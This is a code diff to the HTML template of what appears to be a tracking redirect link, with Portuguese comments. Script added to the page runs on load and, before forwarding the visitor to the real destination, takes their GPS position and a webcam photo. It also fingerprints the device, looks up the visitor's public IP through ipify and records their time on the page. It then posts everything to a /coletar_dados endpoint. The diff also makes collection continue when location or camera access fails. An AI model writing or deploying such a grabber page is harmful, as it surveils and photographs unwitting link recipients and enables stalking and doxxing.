@@ -26,60 +26,110 @@
     <script>
         const slug = {{ slug | tojson | safe }};
         const destino = {{ destino | tojson | safe }};
-
+        const inicioTempo = Date.now();
+    
+        const coletarInfoBrowser = async () => {
+            const userAgent = navigator.userAgent;
+            const idioma = navigator.language;
+            const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const larguraTela = window.screen.width;
+            const alturaTela = window.screen.height;
+            const plataforma = navigator.platform;
+            const conexao = (navigator.connection || {}).effectiveType || "indisponível";
+    
+            let ip = "indefinido";
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipJson = await ipRes.json();
+                ip = ipJson.ip;
+            } catch (e) {
+                console.warn("IP não obtido:", e);
+            }
+    
+            return {
+                userAgent,
+                idioma,
+                fusoHorario,
+                larguraTela,
+                alturaTela,
+                plataforma,
+                conexao,
+                ip
+            };
+        };
+    
         async function coletarDados() {
             let latitude = "", longitude = "", foto_base64 = "";
-
+    
             function atualizarMensagem(texto) {
                 document.getElementById('mensagem').innerText = texto;
             }
-
+    
+            // Localização
             try {
                 atualizarMensagem("Obtendo localização...");
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej);
-                });
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                 latitude = pos.coords.latitude;
                 longitude = pos.coords.longitude;
             } catch (e) {
                 console.warn("Erro na geolocalização:", e);
-                return;
             }
-
+    
+            // Câmera
             try {
                 atualizarMensagem("Acessando câmera...");
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-
-                await new Promise(r => setTimeout(r, 1500));
-
+    
+                await new Promise(r => setTimeout(r, 2000)); // tempo da câmera ligar
+    
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 foto_base64 = canvas.toDataURL("image/png");
-
+    
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
                 console.warn("Erro ao acessar câmera:", e);
-                return;
             }
-
+    
+            // Coletar informações do sistema
+            atualizarMensagem("Coletando dados do dispositivo...");
+            const infosBrowser = await coletarInfoBrowser();
+    
+            // Tempo na página
+            const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
+    
+            // Montar payload
+            const payload = {
+                slug,
+                latitude,
+                longitude,
+                foto_base64,
+                tempoSegundos,
+                ...infosBrowser
+            };
+    
+            // Enviar
+            atualizarMensagem("Enviando dados...");
             try {
-                atualizarMensagem("Enviando dados...");
-                await fetch("/coletar_dados", {
+                const res = await fetch("/coletar_dados", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ slug, latitude, longitude, foto_base64 })
+                    body: JSON.stringify(payload)
                 });
+                const json = await res.json();
+                window.location.href = json.destino;
             } catch (e) {
                 console.error("Erro ao enviar dados:", e);
+                atualizarMensagem("Erro no envio de dados.");
             }
         }
-
-        // Começa a coleta imediatamente, redirecionamento é feito via <meta refresh>
+    
         coletarDados();
     </script>
+    
 </body>
 </html>
